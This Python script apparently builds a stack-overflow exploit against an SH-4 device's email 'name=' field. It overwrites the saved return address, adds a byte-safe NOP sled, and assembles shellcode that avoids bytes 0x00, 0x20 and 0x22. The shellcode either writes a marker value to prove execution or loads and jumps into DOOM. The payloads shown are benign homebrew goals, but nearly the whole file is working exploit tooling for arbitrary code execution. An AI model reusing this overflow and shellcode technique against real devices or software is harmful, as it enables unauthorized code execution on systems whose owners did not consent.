#!/usr/bin/env python3
"""
sh4_stub.py -- build the byte-safe SH-4 payload for the email name= stack overflow.

Constraints: the name= copy stops at 0x00 / 0x20 / 0x22, so EVERY byte of the
payload (pad, PR, sled, stub) must avoid those. SH-4 = 2-byte little-endian insns.

Payload layout written into the stack buffer @ frame_base+0x10:
  [PAD: 64 bytes 'A']              -> fills buffer up to saved PR
  [PR : 4 bytes]                   -> overwrites saved return address (frame_base+0x50)
  [SLED: byte-safe nops]           -> at frame_base+0x54 ; PR points into here
  [STUB: marker write + spin]      -> writes 0x41424344 to MARKER_ADDR, then spins

Marker proof: after firing, read MARKER_ADDR via GDB; == 0x41424344 => our code ran.
"""
import struct, sys

MARKER_ADDR = 0x8C3F0000      # built byte-safely in the stub (all-safe address bytes)
MARKER_VAL  = 0x41424344      # "ABCD" -> all bytes safe; what we expect to read back
BAD = set(b'\x00\x20\x22')

def w(x):                      # 16-bit insn -> little-endian bytes
    return struct.pack("<H", x)

def marker_stub():
    b = b""
    # r0 = 0x41424344 (shift+add, all imm<=0x44, bytes safe)
    b += w(0xE041)            # mov #0x41,r0
    b += w(0x4018)            # shll8 r0      -> 0x4100
    b += w(0x7042)            # add #0x42,r0  -> 0x4142
    b += w(0x4018)            # shll8 r0      -> 0x414200
    b += w(0x7043)            # add #0x43,r0  -> 0x414243
    b += w(0x4018)            # shll8 r0      -> 0x41424300
    b += w(0x7044)            # add #0x44,r0  -> 0x41424344
    # r1 = 0x8C3F0000
    b += w(0xE18C)            # mov #0x8C,r1  -> 0xFFFFFF8C
    b += w(0x4118)            # shll8 r1      -> 0xFFFF8C00
    b += w(0x713F)            # add #0x3F,r1  -> 0xFFFF8C3F
    b += w(0x4118)            # shll8 r1      -> 0xFF8C3F00
    b += w(0x4118)            # shll8 r1      -> 0x8C3F0000
    # *(r1) = r0
    b += w(0x2102)            # mov.l r0,@r1
    # spin forever (PC stays here = detectable)
    b += w(0xAFFE)            # bra .-2  (to itself)
    b += w(0x6003)            # mov r0,r0  (delay slot)
    return b

SLED = w(0x6003)             # mov r0,r0 -- byte-safe nop (03 60); every even offset valid

# ---- byte-safe SH-4 assembler (avoid 0x00/0x20/0x22 in every instruction byte) ----
def _safe_adds(byteval):
    """list of add-#imm values (each 1..0x7F, none 0x20/0x22) summing to byteval (0..255)."""
    out = []; rem = byteval
    while rem > 0:
        step = min(rem, 0x7F)
        if step in (0x20, 0x22): step -= 1          # dodge forbidden imm bytes
        out.append(step); rem -= step
    return out

def load_reg(rn, val):
    """emit byte-safe insns to set Rn = val (32-bit), via mov#/shll8/add#."""
    val &= 0xFFFFFFFF
    b = [(val >> (8*i)) & 0xFF for i in range(4)]    # b[0]=LSB .. b[3]=MSB
    hb = 3
    while hb > 0 and b[hb] == 0: hb -= 1             # highest non-zero byte
    out = b""
    top = b[hb]
    if top in (0x20, 0x22):                          # forbidden as mov-imm: build via top-1 then add 1
        out += w(0xE000 | (rn << 8) | (top-1)); out += w(0x7000 | (rn << 8) | 1)
    else:
        out += w(0xE000 | (rn << 8) | top)           # mov #top,Rn
    for pos in range(hb-1, -1, -1):
        out += w(0x4018 | (rn << 8))                 # shll8 Rn
        for a in _safe_adds(b[pos]):
            out += w(0x7000 | (rn << 8) | a)         # add #a,Rn
    return out

def store_l(rm, rn):                                 # mov.l Rm,@Rn  = 0x2n m2
    return w(0x2002 | (rn << 8) | (rm << 4))

def jmp_r(rn):                                       # jmp @Rn ; mov r0,r0 (delay)
    return w(0x402B | (rn << 8)) + w(0x6003)

WAD_DST, DOOM_DST = 0x8C010000, 0x8CC00000
G_WAD_ADDR, G_WAD_SIZE = 0x8CC56E44, 0x8CC56E40

def doom_loader_stub(wad_size):
    """Assumes doom.bin@DOOM_DST and WAD@WAD_DST are already in RAM (staged).
    Sets g_wad addr/size globals, then jumps to the DOOM entry."""
    s  = load_reg(0, WAD_DST)        # r0 = wad addr
    s += load_reg(1, G_WAD_ADDR)     # r1 = &g_wad_addr
    s += store_l(0, 1)               # *g_wad_addr = wad addr
    s += load_reg(0, wad_size)       # r0 = wad size
    s += load_reg(1, G_WAD_SIZE)     # r1 = &g_wad_size
    s += store_l(0, 1)               # *g_wad_size = wad size
    s += load_reg(0, DOOM_DST)       # r0 = doom entry
    s += jmp_r(0)                    # jmp @r0
    return s

def build(pr, sled_len=0x1000, pad=64):
    payload = b"A"*pad + struct.pack("<I", pr) + SLED*(sled_len//2) + marker_stub()
    bad = [(i,p) for i,p in enumerate(payload) if p in BAD]
    return payload, bad

def sim_load(insns):
    """tiny SH-4 sim for mov#/shll8/add# -> returns final reg file (verify load_reg)."""
    r = [0]*16
    for k in range(0, len(insns), 2):
        op = insns[k] | (insns[k+1] << 8)
        hi = op >> 12
        n = (op >> 8) & 0xF
        if hi == 0xE:                                  # mov #imm,Rn (sign-extend)
            imm = op & 0xFF; r[n] = imm-256 if imm > 0x7F else imm
        elif hi == 0x7:                                # add #imm,Rn (sign-extend imm)
            imm = op & 0xFF; imm = imm-256 if imm > 0x7F else imm; r[n] = (r[n]+imm) & 0xFFFFFFFF
        elif (op & 0xF0FF) == 0x4018:                  # shll8 Rn
            r[n] = (r[n] << 8) & 0xFFFFFFFF
        # store/jmp/etc ignored for the value check
    return r

def build_doom(pr, wad_size, sled=0x2000, pad=64):
    stub = doom_loader_stub(wad_size)
    payload = b"A"*pad + struct.pack("<I", pr) + SLED*(sled//2) + stub
    bad = [(i,p) for i,p in enumerate(payload) if p in BAD]
    return payload, stub, bad

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "doom":
        pr = int(sys.argv[2], 16) if len(sys.argv) > 2 else 0x8C3CC444
        wad_size = int(sys.argv[3], 16) if len(sys.argv) > 3 else 0x4006B4   # doom1.wad=4196020
        sled = int(sys.argv[4], 16) if len(sys.argv) > 4 else 0x2000
        p, stub, bad = build_doom(pr, wad_size, sled)
        # verify each load_reg computes the intended value
        checks = [(WAD_DST,"wad"),(G_WAD_ADDR,"g_wad_addr"),(wad_size,"wad_size"),
                  (G_WAD_SIZE,"g_wad_size"),(DOOM_DST,"doom_entry")]
        print("== load_reg verification ==")
        ok=True
        for val,nm in checks:
            got = sim_load(load_reg(0,val))[0]
            print("  %-12s want 0x%08X got 0x%08X %s"%(nm,val,got,"OK" if got==val else "*** MISMATCH"))
            ok = ok and got==val
        print("loader stub %d bytes: %s"%(len(stub),stub.hex()))
        print("stub byte-safe: %s | payload byte-safe: %s%s"%(
            not any(x in BAD for x in stub), not bad, ("  BAD@"+str(bad[:5]) if bad else "")))
        print("PR=0x%08X sled=0x%X total name= len=%d  all-loads-ok=%s"%(pr,sled,len(p),ok))
        sys.stdout.write("HEX:"+p.hex()+"\n")
    else:
        pr = int(sys.argv[1], 16) if len(sys.argv) > 1 else 0x8C3CC444
        sled = int(sys.argv[2], 16) if len(sys.argv) > 2 else 0x2000
        p, bad = build(pr, sled)
        stub = marker_stub()
        print("marker stub %d bytes: %s" % (len(stub), stub.hex()))
        print("PR=0x%08X sled=0x%X total=%d payload byte-safe: %s"%(pr,sled,len(p),not bad))
        sys.stdout.write("HEX:" + p.hex() + "\n")
